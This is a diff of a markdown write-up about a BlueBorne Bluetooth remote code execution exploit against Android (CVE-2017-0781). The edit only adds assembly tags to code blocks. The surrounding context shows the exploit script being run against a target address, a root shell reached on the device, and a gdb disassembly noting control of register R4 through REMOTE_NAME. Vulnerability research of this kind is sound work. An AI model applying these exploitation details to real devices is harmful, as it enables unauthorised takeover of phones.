@@ -10,7 +10,7 @@ Android Blueborne RCE CVE-2017-0781
 After dozen of executions got this condition in:
 
 
-```
+```asm
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
@@ -2742,7 +2742,7 @@ End of assembler dump.
 
 Execution:
 
-```
+```asm
 python exp4.py hci0 84:55:A5:B6:6F:F6
 [*] Pwn attempt 0:
 [*] Set hci0 to new rand BDADDR 16:e1:66:a7:8a:3d
@@ -2785,7 +2785,8 @@ python exp4.py hci0 84:55:A5:B6:6F:F6
 
 Payload executed:
 
-```
+```asm
+
 s3ve3g:/ # ls -la /data/local/tmp/                                             
 total 24
 drwxrwxrwx 2 shell shell 4096 2014-01-13 02:05 .
@@ -2801,7 +2802,8 @@ More info:
 
 We control R4 via REMOTE_NAME here, starting from 0xacec41be. Disassemble on different execution, so addresses are different, than logs above.
 
-```
+
+```asm
 (gdb) disass
 Dump of assembler code for function btu_hci_msg_ready:
    0xacec41b8 <+0>:	push	{r4, lr}
